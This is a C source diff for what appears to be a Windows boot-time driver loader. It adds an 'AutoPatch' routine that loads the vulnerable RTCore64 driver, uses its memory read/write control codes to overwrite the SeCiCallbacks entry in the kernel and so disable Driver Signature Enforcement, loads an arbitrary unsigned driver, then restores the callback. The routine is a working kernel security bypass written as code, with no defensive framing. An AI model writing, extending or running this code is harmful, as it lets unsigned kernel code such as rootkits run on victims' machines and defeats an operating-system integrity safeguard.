@@ -1063,115 +1063,103 @@ HANDLE OpenDriverDevice(PCWSTR deviceName) {
     return NT_SUCCESS(status) ? hDevice : NULL;
 }
 
-// Patch Driver Signature Enforcement callback in kernel
-NTSTATUS ExecutePatchDSE(PINI_ENTRY entry) {
-    HANDLE hDriver = OpenDriverDevice(entry->DriverDevice);
+// NEW: Execute AutoPatch load - complete DSE bypass sequence for one driver
+NTSTATUS ExecuteAutoPatchLoad(PINI_ENTRY entry, PCONFIG_SETTINGS config) {
+    NTSTATUS status;
+    HANDLE hDriver;
+    ULONGLONG ntBase, callbackToPatch, safeFunction, currentCallback;
+    
+    DisplayMessage(L"INFO: Starting AutoPatch sequence for driver: ");
+    DisplayMessage(entry->ServiceName);
+    DisplayMessage(L"\r\n");
+
+    // Step 1: Load RTCore64 driver
+    DisplayMessage(L"STEP 1: Loading RTCore64 driver...\r\n");
+    status = LoadDriver(L"RTCore64", L"\\SystemRoot\\System32\\drivers\\RTCore64.sys", L"KERNEL", L"SYSTEM");
+    if (!NT_SUCCESS(status) && status != STATUS_IMAGE_ALREADY_LOADED) {
+        DisplayMessage(L"FAILED: Cannot load RTCore64 driver\r\n");
+        return status;
+    }
+    DisplayMessage(L"SUCCESS: RTCore64 driver loaded\r\n");
+
+    // Step 2: Open driver device
+    hDriver = OpenDriverDevice(config->DriverDevice);
     if (!hDriver) {
         DisplayMessage(L"FAILED: Cannot open driver device\r\n");
         return STATUS_NO_SUCH_DEVICE;
     }
 
-    ULONGLONG ntBase = GetNtoskrnlBase();
+    // Step 3: Get ntoskrnl base and calculate patch address
+    ntBase = GetNtoskrnlBase();
     if (ntBase == 0) {
         NtClose(hDriver);
         DisplayMessage(L"FAILED: Cannot find ntoskrnl\r\n");
         return STATUS_OBJECT_NAME_NOT_FOUND;
     }
 
-    ULONGLONG callbackToPatch = ntBase + entry->Offset_SeCiCallbacks + entry->Offset_Callback;
-    ULONGLONG safeFunction = ntBase + entry->Offset_SafeFunction;
+    callbackToPatch = ntBase + config->Offset_SeCiCallbacks + config->Offset_Callback;
+    safeFunction = ntBase + config->Offset_SafeFunction;
 
-    ULONGLONG currentCallback = 0;
-    if (!ReadMemory64(hDriver, callbackToPatch, &currentCallback, entry->IoControlCode_Read)) {
+    // Step 4: Read current callback and save original
+    if (!ReadMemory64(hDriver, callbackToPatch, &currentCallback, config->IoControlCode_Read)) {
         NtClose(hDriver);
         DisplayMessage(L"FAILED: Cannot read current callback\r\n");
         return STATUS_NO_SUCH_DEVICE;
     }
 
     if (currentCallback == safeFunction) {
-        NtClose(hDriver);
-        DisplayMessage(L"INFO: DSE already patched, skipping\r\n");
-        return STATUS_SUCCESS;
-    }
-
-    // Store original callback before patching
-    g_OriginalCallback = currentCallback;
-    SaveStateSection(currentCallback);
-    DisplayMessage(L"INFO: Original callback saved\r\n");
-
-    if (WriteMemory64(hDriver, callbackToPatch, safeFunction, entry->IoControlCode_Write)) {
-        NtClose(hDriver);
-        DisplayMessage(L"SUCCESS: DSE patched\r\n");
-        return STATUS_SUCCESS;
+        DisplayMessage(L"INFO: DSE already patched\r\n");
     } else {
-        NtClose(hDriver);
-        DisplayMessage(L"FAILED: DSE patch write failed\r\n");
-        return STATUS_NO_SUCH_DEVICE;
-    }
-}
+        g_OriginalCallback = currentCallback;
+        SaveStateSection(currentCallback);
+        DisplayMessage(L"INFO: Original callback saved\r\n");
 
-// Restore original DSE callback from saved state
-NTSTATUS ExecuteUnpatchDSE(PINI_ENTRY entry) {
-    if (g_OriginalCallback == 0) {
-        if (!LoadStateSection(&g_OriginalCallback)) {
-            DisplayMessage(L"WARNING: No original callback stored, skipping unpatch\r\n");
-            return STATUS_SUCCESS;
+        // Step 5: Patch DSE
+        DisplayMessage(L"STEP 2: Patching DSE...\r\n");
+        if (!WriteMemory64(hDriver, callbackToPatch, safeFunction, config->IoControlCode_Write)) {
+            NtClose(hDriver);
+            DisplayMessage(L"FAILED: DSE patch write failed\r\n");
+            return STATUS_NO_SUCH_DEVICE;
+        }
+        DisplayMessage(L"SUCCESS: DSE patched\r\n");
+    }
+
+    // Step 6: Load target driver (with DSE disabled)
+    DisplayMessage(L"STEP 3: Loading target driver...\r\n");
+    status = LoadDriver(entry->ServiceName, entry->ImagePath, entry->DriverType, entry->StartType);
+    if (!NT_SUCCESS(status) && status != STATUS_IMAGE_ALREADY_LOADED) {
+        DisplayMessage(L"FAILED: Cannot load target driver");
+        DisplayStatus(status);
+        // Continue to unpatch anyway
+    } else {
+        DisplayMessage(L"SUCCESS: Target driver loaded\r\n");
+    }
+
+    // Step 7: Restore original DSE callback
+    DisplayMessage(L"STEP 4: Restoring DSE...\r\n");
+    if (g_OriginalCallback != 0 && g_OriginalCallback != safeFunction) {
+        if (!WriteMemory64(hDriver, callbackToPatch, g_OriginalCallback, config->IoControlCode_Write)) {
+            DisplayMessage(L"WARNING: DSE restore failed\r\n");
+        } else {
+            DisplayMessage(L"SUCCESS: DSE restored\r\n");
+            g_OriginalCallback = 0;
+            RemoveStateSection();
         }
     }
 
-    WCHAR msgBuf[128];
-    wcscpy(msgBuf, L"INFO: Callback to restore: ");
-    WCHAR hexBuf[32];
-    ULONGLONGToHexString(g_OriginalCallback, hexBuf, TRUE);
-    wcscat(msgBuf, hexBuf);
-    wcscat(msgBuf, L"\r\n");
-    DisplayMessage(msgBuf);
-
-    HANDLE hDriver = OpenDriverDevice(entry->DriverDevice);
-    if (!hDriver) {
-        DisplayMessage(L"FAILED: Cannot open driver device for unpatch\r\n");
-        return STATUS_NO_SUCH_DEVICE;
-    }
-
-    ULONGLONG ntBase = GetNtoskrnlBase();
-    if (ntBase == 0) {
-        NtClose(hDriver);
-        DisplayMessage(L"FAILED: Cannot find ntoskrnl\r\n");
-        return STATUS_OBJECT_NAME_NOT_FOUND;
-    }
-
-    ULONGLONG callbackToRestore = ntBase + entry->Offset_SeCiCallbacks + entry->Offset_Callback;
-    ULONGLONG safeFunction = ntBase + entry->Offset_SafeFunction;
-
-    ULONGLONG currentCallback = 0;
-    if (!ReadMemory64(hDriver, callbackToRestore, &currentCallback, entry->IoControlCode_Read)) {
-        NtClose(hDriver);
-        DisplayMessage(L"FAILED: Cannot read current callback\r\n");
-        return STATUS_NO_SUCH_DEVICE;
-    }
-
-    if (currentCallback == g_OriginalCallback) {
-        NtClose(hDriver);
-        DisplayMessage(L"INFO: DSE already restored, skipping\r\n");
-        RemoveStateSection();
-        return STATUS_SUCCESS;
-    }
-
-    if (currentCallback != safeFunction) {
-        DisplayMessage(L"WARNING: Callback state unexpected\r\n");
-    }
-
-    if (WriteMemory64(hDriver, callbackToRestore, g_OriginalCallback, entry->IoControlCode_Write)) {
-        NtClose(hDriver);
-        DisplayMessage(L"SUCCESS: DSE unpatched (original restored)\r\n");
-        g_OriginalCallback = 0;
-        RemoveStateSection();
-        return STATUS_SUCCESS;
+    // Step 8: Unload RTCore64 driver
+    DisplayMessage(L"STEP 5: Unloading RTCore64 driver...\r\n");
+    NtClose(hDriver);
+    status = UnloadDriver(L"RTCore64");
+    if (NT_SUCCESS(status)) {
+        DisplayMessage(L"SUCCESS: RTCore64 driver unloaded\r\n");
     } else {
-        NtClose(hDriver);
-        DisplayMessage(L"FAILED: DSE unpatch write failed\r\n");
-        return STATUS_NO_SUCH_DEVICE;
+        DisplayMessage(L"WARNING: RTCore64 unload failed");
+        DisplayStatus(status);
     }
+
+    DisplayMessage(L"SUCCESS: AutoPatch sequence completed\r\n");
+    return STATUS_SUCCESS;
 }
 
 // ============================================================================
@@ -1257,7 +1245,7 @@ NTSTATUS ExecuteRename(PINI_ENTRY entry) {
 }
 
 // ============================================================================
-// INI PARSER - Updated with [Config] section support
+// INI PARSER - Updated with AutoPatch support
 // ============================================================================
 
 ULONG ParseIniFile(PWSTR iniContent, PINI_ENTRY entries, ULONG maxEntries, PCONFIG_SETTINGS config) {
@@ -1268,8 +1256,14 @@ ULONG ParseIniFile(PWSTR iniContent, PINI_ENTRY entries, ULONG maxEntries, PCONF
     int currentEntry = -1;
     BOOLEAN inConfigSection = FALSE;
 
-    // Initialize config with defaults
-    config->RestoreHVCI = TRUE; // Default: restore HVCI
+	// Initialize config with defaults
+    config->RestoreHVCI = TRUE;
+    config->DriverDevice[0] = 0;
+    config->IoControlCode_Read = 0;
+    config->IoControlCode_Write = 0;
+    config->Offset_SeCiCallbacks = 0;
+    config->Offset_Callback = 0;
+    config->Offset_SafeFunction = 0;
 
     if (!iniContent || iniContent[0] == 0)
         return 0;
@@ -1330,6 +1324,7 @@ ULONG ParseIniFile(PWSTR iniContent, PINI_ENTRY entries, ULONG maxEntries, PCONF
                 wcscpy(entries[currentEntry].DriverType, L"KERNEL");
                 wcscpy(entries[currentEntry].StartType, L"DEMAND");
                 entries[currentEntry].CheckIfLoaded = FALSE;
+                entries[currentEntry].AutoPatch = FALSE;  // Default to no auto-patch
                 entries[currentEntry].ReplaceIfExists = FALSE;
             } else {
                 currentEntry = -1;
@@ -1349,10 +1344,22 @@ ULONG ParseIniFile(PWSTR iniContent, PINI_ENTRY entries, ULONG maxEntries, PCONF
                 TrimString(key);
                 TrimString(value);
 
-                if (_wcsicmp_impl(key, L"RestoreHVCI") == 0) {
+				if (_wcsicmp_impl(key, L"RestoreHVCI") == 0) {
                     config->RestoreHVCI = (_wcsicmp_impl(value, L"YES") == 0 ||
                                           _wcsicmp_impl(value, L"TRUE") == 0 ||
                                           _wcsicmp_impl(value, L"1") == 0);
+                } else if (_wcsicmp_impl(key, L"DriverDevice") == 0) {
+                    wcscpy(config->DriverDevice, value);
+                } else if (_wcsicmp_impl(key, L"IoControlCode_Read") == 0) {
+                    StringToULONG(value, &config->IoControlCode_Read);
+                } else if (_wcsicmp_impl(key, L"IoControlCode_Write") == 0) {
+                    StringToULONG(value, &config->IoControlCode_Write);
+                } else if (_wcsicmp_impl(key, L"Offset_SeCiCallbacks") == 0) {
+                    StringToULONGLONG(value, &config->Offset_SeCiCallbacks);
+                } else if (_wcsicmp_impl(key, L"Offset_Callback") == 0) {
+                    StringToULONGLONG(value, &config->Offset_Callback);
+                } else if (_wcsicmp_impl(key, L"Offset_SafeFunction") == 0) {
+                    StringToULONGLONG(value, &config->Offset_SafeFunction);
                 }
             }
             continue;
@@ -1375,12 +1382,6 @@ ULONG ParseIniFile(PWSTR iniContent, PINI_ENTRY entries, ULONG maxEntries, PCONF
                         entries[currentEntry].Action = ACTION_LOAD;
                     } else if (_wcsicmp_impl(value, L"UNLOAD") == 0) {
                         entries[currentEntry].Action = ACTION_UNLOAD;
-                    } else if (_wcsicmp_impl(value, L"PATCH_DSE") == 0) {
-                        entries[currentEntry].Action = ACTION_PATCH_DSE;
-                        wcscpy(entries[currentEntry].ServiceName, L"PATCH_DSE");
-                    } else if (_wcsicmp_impl(value, L"UNPATCH_DSE") == 0) {
-                        entries[currentEntry].Action = ACTION_UNPATCH_DSE;
-                        wcscpy(entries[currentEntry].ServiceName, L"UNPATCH_DSE");
                     } else if (_wcsicmp_impl(value, L"RENAME") == 0) {
                         entries[currentEntry].Action = ACTION_RENAME;
                     }
@@ -1396,21 +1397,9 @@ ULONG ParseIniFile(PWSTR iniContent, PINI_ENTRY entries, ULONG maxEntries, PCONF
                     wcscpy(entries[currentEntry].StartType, value);
                 } else if (_wcsicmp_impl(key, L"CheckIfLoaded") == 0) {
                     entries[currentEntry].CheckIfLoaded = (_wcsicmp_impl(value, L"YES") == 0 || _wcsicmp_impl(value, L"TRUE") == 0);
-                } else if (_wcsicmp_impl(key, L"DriverDevice") == 0) {
-                    wcscpy(entries[currentEntry].DriverDevice, value);
-                } else if (_wcsicmp_impl(key, L"IoControlCode_Read") == 0) {
-                    StringToULONG(value, &entries[currentEntry].IoControlCode_Read);
-                } else if (_wcsicmp_impl(key, L"IoControlCode_Write") == 0) {
-                    StringToULONG(value, &entries[currentEntry].IoControlCode_Write);
-                } else if (_wcsicmp_impl(key, L"TargetModule") == 0) {
-                    wcscpy(entries[currentEntry].TargetModule, value);
-                } else if (_wcsicmp_impl(key, L"Offset_SeCiCallbacks") == 0) {
-                    StringToULONGLONG(value, &entries[currentEntry].Offset_SeCiCallbacks);
-                } else if (_wcsicmp_impl(key, L"Offset_Callback") == 0) {
-                    StringToULONGLONG(value, &entries[currentEntry].Offset_Callback);
-                } else if (_wcsicmp_impl(key, L"Offset_SafeFunction") == 0) {
-                    StringToULONGLONG(value, &entries[currentEntry].Offset_SafeFunction);
-                } else if (_wcsicmp_impl(key, L"SourcePath") == 0) {
+                } else if (_wcsicmp_impl(key, L"AutoPatch") == 0) {
+                    entries[currentEntry].AutoPatch = (_wcsicmp_impl(value, L"YES") == 0 || _wcsicmp_impl(value, L"TRUE") == 0 || _wcsicmp_impl(value, L"1") == 0);
+				} else if (_wcsicmp_impl(key, L"SourcePath") == 0) {
                     wcscpy(entries[currentEntry].SourcePath, value);
                 } else if (_wcsicmp_impl(key, L"TargetPath") == 0) {
                     wcscpy(entries[currentEntry].TargetPath, value);
@@ -1496,29 +1485,38 @@ __declspec(noreturn) void __stdcall NtProcessStartup(void* Peb) {
         DisplayMessage(L"]\r\n");
 
         // Skip DSE operations if waiting for HVCI reboot
-        if (skipPatch && (entries[i].Action == ACTION_PATCH_DSE ||
-                          entries[i].Action == ACTION_UNPATCH_DSE)) {
-            DisplayMessage(L"SKIPPED: Waiting for reboot\r\n");
+        if (skipPatch && entries[i].AutoPatch) {
+            DisplayMessage(L"SKIPPED: Waiting for reboot (AutoPatch)\r\n");
             continue;
         }
 
         if (entries[i].Action == ACTION_LOAD) {
-            if (entries[i].CheckIfLoaded && IsDriverLoaded(entries[i].ServiceName)) {
-                DisplayMessage(L"SKIPPED: Already loaded\r\n");
+            if (entries[i].AutoPatch) {
+                // Use new AutoPatch functionality
+                status = ExecuteAutoPatchLoad(&entries[i], &config);
+                if (!NT_SUCCESS(status)) {
+                    DisplayMessage(L"WARNING: AutoPatch failed, continuing...\r\n");
+                }
             } else {
-                status = LoadDriver(entries[i].ServiceName, entries[i].ImagePath,
-                                  entries[i].DriverType, entries[i].StartType);
-
-                if (NT_SUCCESS(status)) {
-                    DisplayMessage(L"SUCCESS: Driver loaded\r\n");
-                } else if (status == STATUS_IMAGE_ALREADY_LOADED) {
-                    DisplayMessage(L"SUCCESS: Already loaded\r\n");
+                // Normal driver load
+                if (entries[i].CheckIfLoaded && IsDriverLoaded(entries[i].ServiceName)) {
+                    DisplayMessage(L"SKIPPED: Already loaded\r\n");
                 } else {
-                    DisplayMessage(L"FAILED: Load failed");
-                    DisplayStatus(status);
+                    status = LoadDriver(entries[i].ServiceName, entries[i].ImagePath,
+                                      entries[i].DriverType, entries[i].StartType);
+
+                    if (NT_SUCCESS(status)) {
+                        DisplayMessage(L"SUCCESS: Driver loaded\r\n");
+                    } else if (status == STATUS_IMAGE_ALREADY_LOADED) {
+                        DisplayMessage(L"SUCCESS: Already loaded\r\n");
+                    } else {
+                        DisplayMessage(L"FAILED: Load failed");
+                        DisplayStatus(status);
+                    }
                 }
             }
         } else if (entries[i].Action == ACTION_UNLOAD) {
+            // Normal driver unload (AutoPatch not applicable for unload)
             if (!IsDriverLoaded(entries[i].ServiceName)) {
                 DisplayMessage(L"SKIPPED: Not loaded\r\n");
             } else {
@@ -1530,16 +1528,6 @@ __declspec(noreturn) void __stdcall NtProcessStartup(void* Peb) {
                     DisplayMessage(L"FAILED: Unload failed");
                     DisplayStatus(status);
                 }
-            }
-        } else if (entries[i].Action == ACTION_PATCH_DSE) {
-            status = ExecutePatchDSE(&entries[i]);
-            if (!NT_SUCCESS(status)) {
-                DisplayMessage(L"WARNING: Patch failed, continuing...\r\n");
-            }
-        } else if (entries[i].Action == ACTION_UNPATCH_DSE) {
-            status = ExecuteUnpatchDSE(&entries[i]);
-            if (!NT_SUCCESS(status)) {
-                DisplayMessage(L"WARNING: Unpatch failed, continuing...\r\n");
             }
         } else if (entries[i].Action == ACTION_RENAME) {
             status = ExecuteRename(&entries[i]);
